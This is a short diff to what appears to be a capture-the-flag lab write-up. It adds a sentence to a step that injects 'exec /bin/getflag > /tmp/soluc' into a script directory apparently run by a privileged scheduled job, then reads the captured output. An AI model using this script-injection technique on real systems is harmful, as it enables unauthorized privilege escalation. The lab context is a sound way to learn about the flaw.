@@ -22,5 +22,9 @@ done
 Let's inject our own script.
 ```sh
 $ echo "exec /bin/getflag > /tmp/soluc" > /opt/openarenaserver/inject.sh
+```
+
+And after few minutes we can read `/tmp/soluc`
+```sh
 $ cat /tmp/soluc
 ```
